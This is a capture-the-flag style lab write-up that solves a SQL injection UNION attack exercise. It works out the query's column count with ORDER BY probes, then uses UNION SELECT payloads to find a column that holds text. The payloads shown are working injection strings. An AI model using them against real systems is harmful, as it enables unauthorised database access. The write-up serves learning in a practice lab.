# SQL injection UNION attack, finding a column containing text

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

    ![](<Images/SQL injection UNION attack, finding a column containing text 0.png>)

    Make the database retrieve the string `'XKKFFx'`

## Solution

When I visited the website, I tested the `Gifts` category and found user-controlled input in the URL.

![](<Images/SQL injection UNION attack, finding a column containing text 1.png>)

I captured the request using Burp Suite and added a single quote `'` to the parameter before sending it.

![](<Images/SQL injection UNION attack, finding a column containing text 2.png>)

As expected, the server returned an error:

```text
Internal Server Error
```

To perform a `UNION` attack, I first needed to find the number of columns in the current query.

Again, I used the `ORDER BY` method with a binary search idea.

Payload format:

```sql
a' ORDER BY <number_of_column> -- -
```

Testing:

```sql
a' ORDER BY 5 -- -
```

Result: Error

```sql
a' ORDER BY 2 -- -
```

Result: Valid

```sql
a' ORDER BY 3 -- -
```

Result: Valid

```sql
a' ORDER BY 4 -- -
```

Result: Error

From these results, I determined that the query has 3 columns.

Now I could use a `UNION` query like this:

```sql
a' UNION SELECT NULL, NULL, NULL -- -
```

According to the lab requirement, I needed to make the database retrieve the string `'XKKFFx'`.

I had 3 `NULL` positions to test.

```sql
a' UNION SELECT 'XKKFFx', NULL, NULL -- -
```

Result: Error

```sql
a' UNION SELECT NULL, 'XKKFFx', NULL -- -
```

Result: Valid

This showed that the second column accepts text data.

The lab was solved successfully.

![](<Images/SQL injection UNION attack, finding a column containing text 3.png>)